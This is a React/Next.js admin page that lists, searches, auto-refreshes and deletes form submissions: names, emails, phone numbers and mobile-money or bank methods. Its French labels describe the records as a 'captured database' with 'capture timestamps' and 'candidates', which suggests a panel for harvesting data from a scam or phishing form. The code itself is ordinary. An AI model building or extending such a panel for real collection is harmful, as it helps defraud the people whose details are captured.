'use client';

import { useState, useEffect, useCallback, useMemo } from 'react';
import {
    Search,
    Download,
    Trash2,
    RefreshCcw,
    Loader2,
    Filter,
    ArrowUpDown
} from 'lucide-react';
import { cn, formatDate } from '@/lib/utils';
import Link from 'next/link';
import { api } from '@/lib/api';

interface Submission {
    id: string;
    full_name: string;
    email: string;
    phone: string;
    method: string;
    created_at: string;
    status: string;
}

export default function SubmissionsPage() {
    const [submissions, setSubmissions] = useState<Submission[]>([]);
    const [loading, setLoading] = useState(true);
    const [searchQuery, setSearchQuery] = useState('');

    const fetchSubmissions = useCallback(async () => {
        setLoading(true);
        try {
            const data = await api.get('/submissions/');
            if (data) {
                setSubmissions(data);
            }
        } catch (error) {
            console.error('Error fetching submissions:', error);
        } finally {
            setLoading(false);
        }
    }, []);

    useEffect(() => {
        fetchSubmissions();
        const interval = setInterval(fetchSubmissions, 30000);
        return () => clearInterval(interval);
    }, [fetchSubmissions]);

    const deleteSubmission = async (id: string) => {
        if (!confirm('Êtes-vous sûr de vouloir supprimer cette soumission ?')) return;
        try {
            await api.delete(`/submissions/${id}/`);
            fetchSubmissions();
        } catch (error) {
            console.error('Error deleting:', error);
        }
    };

    const filteredSubmissions = useMemo(() => {
        return submissions.filter(s =>
            s.full_name.toLowerCase().includes(searchQuery.toLowerCase()) ||
            s.email.toLowerCase().includes(searchQuery.toLowerCase()) ||
            s.phone.includes(searchQuery)
        );
    }, [submissions, searchQuery]);

    const getMethodConfig = (method: string) => {
        switch (method.toLowerCase()) {
            case 'orange': return { color: 'text-orange-500', emoji: '🟠', bg: 'bg-orange-500/10' };
            case 'mtn': return { color: 'text-yellow-500', emoji: '🟡', bg: 'bg-yellow-500/10' };
            case 'wave': return { color: 'text-blue-400', emoji: '🌊', bg: 'bg-blue-400/10' };
            case 'bank': return { color: 'text-blue-500', emoji: '🏦', bg: 'bg-blue-500/10' };
            default: return { color: 'text-white', emoji: '📱', bg: 'bg-white/10' };
        }
    };

    return (
        <div className="space-y-8 animate-fade-in pb-20">
            <div className="py-8 border-y border-white/5 bg-white/[0.01] flex items-center justify-between px-10">
                <div className="flex flex-col">
                    <h2 className="text-[12px] font-black uppercase tracking-[5px] text-white italic leading-none mb-1">📋 BASE DE DONNÉES CAPTURÉE</h2>
                    <span className="text-[10px] text-brand-primary font-bold uppercase tracking-widest">{filteredSubmissions.length} DOSSIERS TROUVÉS</span>
                </div>
                <button
                    onClick={fetchSubmissions}
                    className="flex items-center gap-3 px-6 py-2.5 rounded-xl bg-white/5 border border-white/10 text-[10px] font-black uppercase tracking-widest hover:bg-white/10 transition-all text-white/50 hover:text-white"
                >
                    <RefreshCcw className={cn("w-3.5 h-3.5", loading && "animate-spin")} /> ACTUALISER LE FLUX
                </button>
            </div>

            <div className="grid grid-cols-1 lg:grid-cols-4 gap-6 px-4">
                <div className="lg:col-span-3 relative">
                    <Search className="absolute left-6 top-1/2 -translate-y-1/2 w-4 h-4 text-brand-primary opacity-40" />
                    <input
                        type="text"
                        placeholder="Filtrer en temps réel (Nom, Email, Tel...)"
                        value={searchQuery}
                        onChange={e => setSearchQuery(e.target.value)}
                        className="w-full bg-white/[0.02] border border-white/10 rounded-3xl py-5 pl-16 pr-8 text-[14px] focus:border-brand-primary/40 focus:bg-white/[0.05] transition-all outline-none font-bold"
                    />
                </div>
                <button className="h-full bg-brand-primary text-white rounded-3xl font-black text-[10px] uppercase tracking-[4px] shadow-2xl flex items-center justify-center gap-3">
                    <Download className="w-4 h-4" /> EXPORTER CSV
                </button>
            </div>

            <div className="glass-card rounded-[40px] overflow-hidden border-white/5 shadow-2xl relative min-h-[500px]">
                {loading && (
                    <div className="absolute inset-0 bg-brand-bg/40 backdrop-blur-md z-50 flex items-center justify-center">
                        <Loader2 className="w-12 h-12 text-brand-primary animate-spin" />
                    </div>
                )}

                <div className="overflow-x-auto no-scrollbar">
                    <table className="w-full text-left">
                        <thead>
                            <tr className="bg-white/[0.03] border-b border-white/5">
                                <th className="px-10 py-8 text-[10px] font-black uppercase tracking-[4px] text-brand-text-dim">CANDIDAT / ID</th>
                                <th className="px-6 py-8 text-[10px] font-black uppercase tracking-[4px] text-brand-text-dim">COORDONNÉES</th>
                                <th className="px-6 py-8 text-[10px] font-black uppercase tracking-[4px] text-brand-text-dim">MÉTHODE</th>
                                <th className="px-6 py-8 text-[10px] font-black uppercase tracking-[4px] text-brand-text-dim">CAPTURE TIMESTAMP</th>
                                <th className="px-10 py-8 text-[10px] font-black uppercase tracking-[4px] text-brand-text-dim text-right">GESTION</th>
                            </tr>
                        </thead>
                        <tbody className="divide-y divide-white/5">
                            {filteredSubmissions.map((sub) => {
                                const config = getMethodConfig(sub.method);
                                return (
                                    <tr key={sub.id} className="group hover:bg-white/[0.02] transition-all">
                                        <td className="px-10 py-8">
                                            <div className="flex flex-col">
                                                <span className="font-black text-[15px] text-white uppercase group-hover:text-brand-primary transition-colors">{sub.full_name}</span>
                                                <span className="text-[10px] font-bold text-brand-primary/40 uppercase tracking-widest mt-1">STATUS: {sub.status}</span>
                                            </div>
                                        </td>
                                        <td className="px-6 py-8">
                                            <div className="flex flex-col gap-1">
                                                <span className="text-[13px] font-bold flex items-center gap-2 opacity-80">📧 {sub.email}</span>
                                                <span className="text-[12px] font-bold opacity-30 tracking-[2px]">📱 {sub.phone}</span>
                                            </div>
                                        </td>
                                        <td className="px-6 py-8">
                                            <div className={cn("inline-flex items-center gap-3 px-5 py-2.5 rounded-2xl border border-white/5 font-black uppercase text-[10px] tracking-widest leading-none", config.bg, config.color)}>
                                                <span>{config.emoji}</span>
                                                {sub.method}
                                            </div>
                                        </td>
                                        <td className="px-6 py-8">
                                            <div className="flex flex-col">
                                                <span className="text-[13px] font-bold opacity-60 italic">{formatDate(sub.created_at, 'long')}</span>
                                                <span className="text-[9px] opacity-20 uppercase font-black tracking-widest mt-1">Certified Timestamp</span>
                                            </div>
                                        </td>
                                        <td className="px-10 py-8 text-right">
                                            <div className="flex items-center justify-end gap-3 opacity-20 group-hover:opacity-100 transition-all scale-95 group-hover:scale-100">
                                                <Link href={`/dashboard/submissions/${sub.id}`} className="px-5 py-2.5 rounded-xl bg-white/5 border border-white/10 hover:bg-brand-primary/20 hover:text-brand-primary transition-all text-[10px] font-black uppercase tracking-widest">[ VOIR DÉTAILS ]</Link>
                                                <button
                                                    onClick={() => deleteSubmission(sub.id)}
                                                    className="p-3 rounded-xl bg-red-400/5 border border-red-400/10 hover:bg-red-500 hover:text-white transition-all text-red-500"
                                                >
                                                    <Trash2 className="w-4 h-4" />
                                                </button>
                                            </div>
                                        </td>
                                    </tr>
                                );
                            })}
                        </tbody>
                    </table>
                </div>
                {filteredSubmissions.length === 0 && !loading && (
                    <div className="py-40 text-center space-y-4 opacity-20">
                        <Search className="w-16 h-16 mx-auto" />
                        <p className="font-black uppercase text-xs tracking-[5px]">Aucune donnée correspondante</p>
                    </div>
                )}
            </div>
        </div>
    );
}
